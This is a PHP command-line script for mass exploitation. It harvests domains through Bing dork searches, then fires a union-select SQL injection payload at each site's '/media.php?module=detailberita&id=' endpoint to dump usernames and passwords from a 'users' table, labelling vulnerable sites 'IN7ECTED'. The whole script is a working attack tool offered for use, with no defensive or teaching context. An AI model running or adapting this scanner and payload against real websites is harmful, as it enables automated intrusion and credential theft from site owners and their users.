<?php
set_time_limit(0);

function getsource($url) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}
function ngebing($dork,$nama){
$do = urlencode($dork);
if(isset($dork)) {
	$npage = 1;
	$npages = 30000;
	$allLinks = array();
	$lll = array();
	while($npage <= $npages) {
	    $x = getsource("http://www.bing.com/search?q=".$do."&first=".$npage);
	    if($x) {
	        preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
	        foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
	        $npage = $npage + 10;
	        if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
	    } else break;
	}
	$URLs = array();
	foreach($allLinks as $url){
	    $exp = explode("/", $url);
	    $URLs[] = $exp[2];
	}
	$array = array_filter($URLs);
	$array = array_unique($array);
	$sss = count(array_unique($array));
	//echo "ToTaL SiTe : $sss\n";
	//echo "--------------------------------------\n";
	foreach($array as $domain) {
	$s= "http://$domain/\n";
	$fp = fopen($nama,"a");
	fwrite($fp,$s);
	fclose($fp);
	echo $s;
	}
}
}

function ngehek($url)
{
	global $merah,$hijau;
	$merah = "\033[1;31m";
	$hijau = "\033[1;32m";
	$netral = "\033[1;0m";

	$c= curl_init();
	$curl=array(
		CURLOPT_URL=>$url,
		CURLOPT_RETURNTRANSFER=>1,
		CURLOPT_FOLLOWLOCATION=>0,
		);
	curl_setopt_array($c,$curl);
	$e = curl_exec($c);
	if(preg_match("/WOS/",$e)){
		echo $hijau."[ IN7ECTED ] ".$netral."\n";
		echo "[ SITES ] ".$url."\n";
	}else{
		echo $merah."[ 7373KBAU ] ".$netral."\n";
		echo "[ SITES ] ".$url."\n";
	}
	curl_close($c);
}

$dork_lol = getopt("d:o:");
if(empty($dork_lol))
{
	echo "Usage : ".$argv[0]." -d=\"semua-berita.html\" -o \"output.txt\" \n\n";
}else{
ngebing($dork_lol['d'],$dork_lol['o']);
if(file_exists($dork_lol['o']))
{
	
$gc=file_get_contents($dork_lol['o']);
$exp = explode("\n",$gc);
foreach($exp as $x){
	$url = "/media.php?module=detailberita&id=.103'+union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x23,username,0x3a574f533a,password,0x3c62723e)),@)--+";
	ngehek($x.$url);

}
}else{
	echo "[+] File output engga ada";
}
}


?>
